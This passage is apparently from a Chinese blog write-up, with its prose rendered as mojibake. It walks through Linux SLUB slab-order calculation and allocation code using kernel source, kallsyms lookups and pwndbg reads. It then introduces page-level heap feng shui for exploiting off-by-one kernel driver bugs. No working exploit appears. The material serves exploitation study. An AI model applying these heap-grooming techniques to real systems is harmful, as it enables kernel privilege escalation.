<p>å¯ä»¥æ³¨æ„åˆ°æœ€ç»ˆçš„orderæ˜¯ç”±<code>calc_slab_order</code>å‡½æ•°ç”Ÿæˆçš„ã€‚è€Œè¿™é‡Œçš„<code>min_objects</code>å˜é‡å¯ä»¥çœ‹åˆ°æ˜¯ç”±<code>slub_min_objects</code>èµ‹å€¼çš„ã€‚è¿™ä¸ªå…¨å±€å˜é‡çš„å«ä¹‰æ˜¯ï¼šæ¯ä¸ªslabçš„æœ€å°objectæ•°é‡ï¼Œåœ¨æ²¡æœ‰é…ç½®çš„æƒ…å†µä¸‹æ˜¯0ã€‚ä¸è¿‡å¯ä»¥çœ‹åˆ°å¦‚æœæ˜¯0çš„è¯ä¼šè¿›å…¥åˆ°ç´§æ¥ç€çš„ifè¯­å¥å†…ï¼Œå†…éƒ¨çš„<code>nr_cpu_ids</code>å˜é‡çš„å€¼æ˜¯å¤„ç†å™¨æ•°ã€‚fls å¯ä»¥è·å–å‚æ•°çš„æœ€é«˜æœ‰æ•ˆ bit çš„ä½æ•°ï¼Œæ¯”å¦‚ fls(0)&#x3D;0ï¼Œfls(1)&#x3D;1ï¼Œfls(4) &#x3D; 3ã€‚å¦‚æœå½“å‰ç³»ç»Ÿä¸­æœ‰4ä¸ªcpuï¼Œé‚£ä¹ˆ min_object çš„åˆå§‹å€¼ä¸º 4*(3+1) &#x3D; 16ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">~ cat /proc/kallsyms | grep slub_min_objects</span><br><span class="line">ffffffff8a23b2d0 t __cfi_setup_slub_min_objects</span><br><span class="line">ffffffff8a23b2e0 t setup_slub_min_objects</span><br><span class="line">ffffffff8a4348af t __setup_str_setup_slub_min_objects</span><br><span class="line">ffffffff8a45e460 t __setup_setup_slub_min_objects</span><br><span class="line">ffffffff8b3d5fbc b slub_min_objects</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/1xw 0xffffffff8b3d5fbc</span><br><span class="line">0xffffffff8b3d5fbc:	0x00000000</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">~ cat /proc/kallsyms | grep nr_cpu_ids</span><br><span class="line">ffffffff97f73fa8 D nr_cpu_ids</span><br><span class="line">ffffffff98025f10 T __cfi_setup_nr_cpu_ids</span><br><span class="line">ffffffff98025f20 T setup_nr_cpu_ids</span><br><span class="line">ffffffff990f3098 b rcu_init_geometry.old_nr_cpu_ids</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/1xw 0xffffffff97f73fa8</span><br><span class="line">0xffffffff97f73fa8:	0x00000004</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>

<p>æŒ‰ç…§ä¸Šè¿°æ­¥éª¤æŸ¥çœ‹ä¹‹åå¯ä»¥çœ‹åˆ°<code>nr_cpu_ids</code>çš„å€¼ä¸º4ï¼Œæ‰€ä»¥è¿™é‡Œçš„<code>min_object</code>çš„å€¼ä¸º<code>0x10</code>ã€‚</p>
<p>è€Œå‡½æ•°ä¸­<code>fraction</code>æ˜¯å¯¹äºç¢ç‰‡çš„ä¸€ç§æŒ‡æ ‡ã€‚ç¢ç‰‡å¤§å°ä¸èƒ½è¶…è¿‡ (slabæ‰€å å†…å­˜å¤§å° &#x2F; fraction)ï¼Œfraction å€¼è¶Šå¤§ï¼Œslab ä¸­æ‰€èƒ½å®¹å¿çš„ç¢ç‰‡å°±è¶Šå°ã€‚</p>
<h4 id="calc-slab-orderå‡½æ•°"><a href="#calc-slab-orderå‡½æ•°" class="headerlink" title="calc_slab_orderå‡½æ•°"></a>calc_slab_orderå‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ilog2</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> l = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> ((<span class="number">1UL</span> &lt;&lt; l) &lt; v)</span><br><span class="line">		l++;</span><br><span class="line">	<span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline __attribute_const__ <span class="keyword">int</span> <span class="title">get_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (__builtin_constant_p(size)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!size)</span><br><span class="line">			<span class="keyword">return</span> BITS_PER_LONG - PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (size &lt; (<span class="number">1UL</span> &lt;&lt; PAGE_SHIFT))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> ilog2((size) - <span class="number">1</span>) - PAGE_SHIFT + <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	size--;</span><br><span class="line">	size &gt;&gt;= PAGE_SHIFT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BITS_PER_LONG == 32</span></span><br><span class="line">	<span class="keyword">return</span> fls(size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> fls64(size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">calc_slab_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">int</span> min_objects, <span class="keyword">unsigned</span> <span class="keyword">int</span> max_order,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">int</span> fract_leftover)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> min_order = slub_min_order;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> order;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (order_objects(min_order, size) &gt; MAX_OBJS_PER_PAGE)</span><br><span class="line">		<span class="keyword">return</span> get_order(size * MAX_OBJS_PER_PAGE) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (order = max(min_order, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)get_order(min_objects * size));</span><br><span class="line">			order &lt;= max_order; order++) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> slab_size = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)PAGE_SIZE &lt;&lt; order;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> rem;</span><br><span class="line"></span><br><span class="line">		rem = slab_size % size;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (rem &lt;= slab_size / fract_leftover)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> order;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°å°±æ˜¯æœ€ç»ˆè®¡ç®—å‡º<code>order</code>çš„å‡½æ•°äº†ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šä»slabæ‰€éœ€è¦çš„æœ€å°orderåˆ°æœ€å¤§orderä¹‹é—´å¼€å§‹éå†ï¼ŒæŸ¥æ‰¾èƒ½å¤Ÿä½¿slabç¢ç‰‡æœ€å°çš„orderå€¼ã€‚è€Œremåˆ™æ˜¯slabçš„ç¢ç‰‡å¤§å°ï¼šåˆ†é…å®Œobjectä¹‹åï¼Œæ‰€äº§ç”Ÿçš„ç¢ç‰‡å¤§å°ã€‚ç¢ç‰‡å¤§å°remä¸èƒ½è¶…è¿‡<code>slab_size / fract_leftover</code>å³ç¬¦åˆè¦æ±‚ã€‚</p>
<p>è¿™é‡Œçš„<code>get_order</code>å‡½æ•°ä¹Ÿè¾ƒä¸ºç®€å•ï¼Œ<del>è¿™ç‹—å±ç©æ„ï¼Œå¼€å§‹çœ‹é”™äº†æ–‡ä»¶å¯¼è‡´ä¸€ç›´çœ‹ä¸æ‡‚ï¼Œç¡¬ç”Ÿç”Ÿçœ‹äº†ä¸¤ä¸ªå°æ—¶æ‰ååº”è¿‡æ¥äº†</del>ã€‚ä¹Ÿå°±æ˜¯æ ¹æ®sizeè¿”å›å¯¹åº”çš„æœ€å°çš„<code>order</code>ï¼Œæ‰€ä»¥è¿™é‡Œçš„å¦‚æœæ ¹æ®ä¸Šä¸€ä¸ªå‡½æ•°ä¸­çš„<code>min_object</code>çš„å€¼ä¸º<code>0x10</code>æ¥çœ‹çš„è¯ï¼Œæœ€ç»ˆè¿”å›çš„<code>order</code>ä¹Ÿå°±æ˜¯3ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">order_objects</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> order, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)PAGE_SIZE &lt;&lt; order) / size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct kmem_cache_order_objects <span class="title">oo_make</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">x</span> =</span> &#123;</span><br><span class="line">		(order &lt;&lt; OO_SHIFT) + order_objects(order, size)</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åç”±<code>oo_make</code>å‡½æ•°å†™å…¥åˆ°ooæˆå‘˜ä¸­å»äº†ã€‚</p>
<h3 id="kmem-cache-allocæµç¨‹"><a href="#kmem-cache-allocæµç¨‹" class="headerlink" title="kmem_cache_allocæµç¨‹"></a>kmem_cache_allocæµç¨‹</h3><p>å¯ä»¥çœ‹åˆ°å‰é¢<code>kmem_cache_create_usercopy</code>å‡½æ•°åªæ˜¯å¯¹<code>kmem_cache</code>ç»“æ„ä½“é‡Œé¢çš„æˆå‘˜è¿›è¡Œåˆå§‹åŒ–èµ‹å€¼ï¼Œå¹¶æ²¡æœ‰å®è´¨æ€§çš„ç”Ÿæˆslabã€‚è€ŒçœŸæ­£åˆ†é…slabæ˜¯åœ¨ç¬¬ä¸€æ¬¡å¯¹è¿™ä¸ªcacheç”³è¯·objectçš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªå°æ ‡é¢˜çš„å‡½æ•°ã€‚</p>
<p>è¿™é‡Œçš„è°ƒç”¨æµç¨‹å°±æ˜¯ï¼š<code>kmem_cache_alloc</code>&#x3D;&gt;<code>__kmem_cache_alloc_lru</code>&#x3D;&gt;<code>slab_alloc</code>&#x3D;&gt;<code>slab_alloc_node</code>&#x3D;&gt;<code>__slab_alloc_node</code>&#x3D;&gt;<code>new_slab</code>&#x3D;&gt;<code>allocate_slab</code>&#x3D;&gt;<code>alloc_slab_page</code></p>
<h4 id="slab-alloc-nodeå‡½æ•°"><a href="#slab-alloc-nodeå‡½æ•°" class="headerlink" title="__slab_alloc_nodeå‡½æ•°"></a>__slab_alloc_nodeå‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *__slab_alloc_node(struct kmem_cache *s,</span><br><span class="line">		<span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">size_t</span> orig_size)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">partial_context</span> <span class="title">pc</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *object;</span><br><span class="line"></span><br><span class="line">	pc.flags = gfpflags;</span><br><span class="line">	pc.slab = &amp;slab;</span><br><span class="line">	pc.orig_size = orig_size;</span><br><span class="line">	object = get_partial(s, node, &amp;pc);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (object)</span><br><span class="line">		<span class="keyword">return</span> object;</span><br><span class="line"></span><br><span class="line">	slab = new_slab(s, gfpflags, node);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!slab)) &#123;</span><br><span class="line">		slab_out_of_memory(s, gfpflags, node);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	object = alloc_single_from_new_slab(s, slab, orig_size);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åˆ†é…é¡ºåºå°±æ˜¯é¦–å…ˆè®¿é—®<code>partial</code>æŒ‡é’ˆä¸­ï¼Œå¦‚æœå…¶ä¸­æ²¡æœ‰å¯ä»¥è¿”å›çš„objectå°±ä¼šæ‰§è¡Œåˆ°<code>new_slab</code>å‡½æ•°åˆ†é…æ–°çš„slabã€‚</p>
<h4 id="alloc-single-from-new-slabå‡½æ•°"><a href="#alloc-single-from-new-slabå‡½æ•°" class="headerlink" title="alloc_single_from_new_slabå‡½æ•°"></a>alloc_single_from_new_slabå‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">alloc_single_from_new_slab</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">					struct slab *slab, <span class="keyword">int</span> orig_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> nid = slab_nid(slab);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span> =</span> get_node(s, nid);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">	<span class="keyword">void</span> *object;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	object = slab-&gt;freelist;</span><br><span class="line">	slab-&gt;freelist = get_freepointer(s, object);</span><br><span class="line">	slab-&gt;inuse = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!alloc_debug_processing(s, slab, object, orig_size))</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * It&#x27;s not really expected that this would fail on a</span></span><br><span class="line"><span class="comment">		 * freshly allocated slab, but a concurrent memory</span></span><br><span class="line"><span class="comment">		 * corruption in theory could cause that.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	spin_lock_irqsave(&amp;n-&gt;list_lock, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (slab-&gt;inuse == slab-&gt;objects)</span><br><span class="line">		add_full(s, n, slab);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		add_partial(n, slab, DEACTIVATE_TO_HEAD);</span><br><span class="line"></span><br><span class="line">	inc_slabs_node(s, nid, slab-&gt;objects);</span><br><span class="line">	spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¸»è¦åšçš„äº‹å°±æ˜¯é¦–å…ˆå–ä¸‹<code>freelist</code>æŒ‡å‘çš„objectï¼Œéšåå°†slabæ·»åŠ åˆ°<code>partial</code>æŒ‡é’ˆå¤„ã€‚</p>
<h4 id="allocate-slabå‡½æ•°"><a href="#allocate-slabå‡½æ•°" class="headerlink" title="allocate_slabå‡½æ•°"></a>allocate_slabå‡½æ•°</h4><p>ä¸Šé¢æåˆ°äº†<code>new_slab</code>å‡½æ•°ï¼Œå…¶å®å®è´¨ä¸Šè°ƒç”¨çš„æ˜¯è¿™ä¸ªå‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct slab *<span class="title">allocate_slab</span><span class="params">(struct kmem_cache *s, <span class="keyword">gfp_t</span> flags, <span class="keyword">int</span> node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span> =</span> s-&gt;oo;</span><br><span class="line">	<span class="keyword">gfp_t</span> alloc_gfp;</span><br><span class="line">	<span class="keyword">void</span> *start, *p, *next;</span><br><span class="line">	<span class="keyword">int</span> idx;</span><br><span class="line">	<span class="keyword">bool</span> shuffle;</span><br><span class="line"></span><br><span class="line">	... ...</span><br><span class="line"></span><br><span class="line">	slab = alloc_slab_page(alloc_gfp, node, oo);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!slab)) &#123;</span><br><span class="line">		oo = s-&gt;min;</span><br><span class="line">		alloc_gfp = flags;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Allocation may have failed due to fragmentation.</span></span><br><span class="line"><span class="comment">		 * Try a lower order alloc if possible</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		slab = alloc_slab_page(alloc_gfp, node, oo);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!slab))</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">		stat(s, ORDER_FALLBACK);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	slab-&gt;objects = oo_objects(oo);</span><br><span class="line">	slab-&gt;inuse = <span class="number">0</span>;</span><br><span class="line">	slab-&gt;frozen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	account_slab(slab, oo_order(oo), s, flags);</span><br><span class="line"></span><br><span class="line">	slab-&gt;slab_cache = s;</span><br><span class="line"></span><br><span class="line">	kasan_poison_slab(slab);</span><br><span class="line"></span><br><span class="line">	start = slab_address(slab);</span><br><span class="line"></span><br><span class="line">	setup_slab_debug(s, slab, start);</span><br><span class="line"></span><br><span class="line">	shuffle = shuffle_freelist(s, slab);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!shuffle) &#123;</span><br><span class="line">		start = fixup_red_left(s, start);</span><br><span class="line">		start = setup_object(s, start);</span><br><span class="line">		slab-&gt;freelist = start;</span><br><span class="line">		<span class="keyword">for</span> (idx = <span class="number">0</span>, p = start; idx &lt; slab-&gt;objects - <span class="number">1</span>; idx++) &#123;</span><br><span class="line">			next = p + s-&gt;size;</span><br><span class="line">			next = setup_object(s, next);</span><br><span class="line">			set_freepointer(s, p, next);</span><br><span class="line">			p = next;</span><br><span class="line">		&#125;</span><br><span class="line">		set_freepointer(s, p, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> slab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯¹äºæ–°åˆ†é…çš„slabé¦–å…ˆå†™çš„å°±æ˜¯ä»–çš„<code>freelist</code>æŒ‡é’ˆï¼Œæ‰€ä»¥æ ¹æ®ä¸Šé¢å¤–å±‚å‡½æ•°çš„è°ƒç”¨é¡ºåºæ¥çœ‹ï¼Œåœ¨åˆšæŒ‚è½½åˆ°<code>freelist</code>ç´§æ¥ç€å°±ä¼šè¿”å›objectå¹¶é‡æ–°æŒ‚è½½åˆ°<code>partial</code>ä¸Šã€‚</p>
<p>ä¹Ÿå¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°ä¸­è°ƒç”¨äº†åœ¨slabåˆ†é…åˆ†æå¼€å¤´ç»™å‡ºçš„å‡½æ•°<code>alloc_slab_page</code>ã€‚</p>
<h2 id="é¡µçº§å †é£æ°´æ„é€ "><a href="#é¡µçº§å †é£æ°´æ„é€ " class="headerlink" title="é¡µçº§å †é£æ°´æ„é€ "></a>é¡µçº§å †é£æ°´æ„é€ </h2><p>ç»ˆäºè¦è¯´åˆ°è·Ÿé¢˜ç›®æœ‰å…³ç³»çš„å†…å®¹äº†ã€‚</p>
<p>å¦‚æœæåˆ°ä¸€ä¸ªé©±åŠ¨å­˜åœ¨<code>off by null</code>æˆ–è€…<code>off by one</code>æ¼æ´æ—¶ï¼Œæˆ‘çš„ç¬¬ä¸€ååº”å°±æ˜¯è¿™ä¸ª<a class="link"   target="_blank" rel="noopener" href="https://cv196082.gitee.io/2022/09/20/CVE-2021-22555%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/" >CVE-2021-22555<i class="fas fa-external-link-alt"></i></a>ä¸­çš„åŠæ³•ï¼Œä½¿ç”¨å¤§é‡å †å–·æ¥å®Œæˆã€‚ä½†æ˜¯å¦‚æœé¢˜ç›®çš„slabæ˜¯ç”±<code>kmem_cache_create_usercopy</code>åˆ›å»ºçš„è¯å›°éš¾å°±ä¼šå­˜åœ¨å¾ˆå¤§çš„é—®é¢˜äº†ï¼Œå¦‚æœä½ å½“å‰ä½¿ç”¨å †å–·çš„å †å—çš„orderä¸åˆ›å»ºçš„cacheä¸ä¸€è‡´ï¼Œè¿™æ ·åªæœ‰æä½çš„æ¦‚ç‡å¯ä»¥è®©é©±åŠ¨ç”Ÿæˆçš„slabç´§é‚»å †å–·çš„slabã€‚æ‰€ä»¥ä¸ºäº†æé«˜è„šæœ¬çš„ç¨³å®šæ€§ï¼Œå‡ºç°äº†è¿™ä¸€åˆ©ç”¨æ‰‹æ³•ã€‚</p>
<p>å…¶å®è¿™ä¸€æ‰‹æ³•ä»¥å‰åœ¨å®‰å…¨å®¢ä¸­æœ‰çœ‹åˆ°ä½†æ˜¯å½“æ—¶å¹¶æ²¡æœ‰åœ¨æ„ï¼Œæ‰€ä»¥ç°åœ¨å€Ÿç€å¢¨æ™šé¸¢ä½¬çš„åšå®¢å­¦ä¹ ä¸€ä¸‹ã€‚é¡µçº§å †é£æ°´å³ä»¥å†…å­˜é¡µä¸ºç²’åº¦çš„å†…å­˜æ’å¸ƒæ–¹å¼ï¼Œè€Œå†…æ ¸å†…å­˜é¡µçš„æ’å¸ƒå¯¹æˆ‘ä»¬æ¥è¯´ä¸ä»…æœªçŸ¥ä¸”ä¿¡æ¯é‡å·¨å¤§ï¼Œå› æ­¤è¿™ç§åˆ©ç”¨æ‰‹æ³•å®é™…ä¸Šæ˜¯è®©æˆ‘ä»¬æ‰‹å·¥æ„é€ ä¸€ä¸ªæ–°çš„å·²çŸ¥çš„é¡µçº§ç²’åº¦å†…å­˜é¡µæ’å¸ƒã€‚</p>
<p>åœ¨ä¸Šè¿°è§£é‡Šå®Œslabçš„åˆ†é…è¿‡ç¨‹æƒ³å¿…åº”è¯¥éƒ½èƒ½ç†è§£<code>buddy system</code>äº†ï¼Œä»–çš„åŸºæœ¬åŸç†å°±æ˜¯ä»¥ 2 çš„ order æ¬¡å¹‚å¼ å†…å­˜é¡µä½œä¸ºåˆ†é…ç²’åº¦ï¼Œç›¸åŒ order é—´ç©ºé—²é¡µé¢æ„æˆåŒå‘é“¾è¡¨ï¼Œå½“ä½é˜¶ order çš„é¡µé¢ä¸å¤Ÿç”¨æ—¶ä¾¿ä¼šä»é«˜é˜¶ order å–ä¸€ä»½è¿ç»­å†…å­˜é¡µæ‹†æˆä¸¤åŠï¼Œå…¶ä¸­ä¸€åŠæŒ‚å›å½“å‰è¯·æ±‚ order é“¾è¡¨ï¼Œå¦ä¸€åŠè¿”è¿˜ç»™ä¸Šå±‚è°ƒç”¨è€…ï¼›ä¸‹å›¾ä¸ºä»¥ order 2 ä¸ºä¾‹çš„ buddy system é¡µé¢åˆ†é…åŸºæœ¬åŸç†ï¼ˆå·çš„å›¾ï¼‰ï¼š</p>
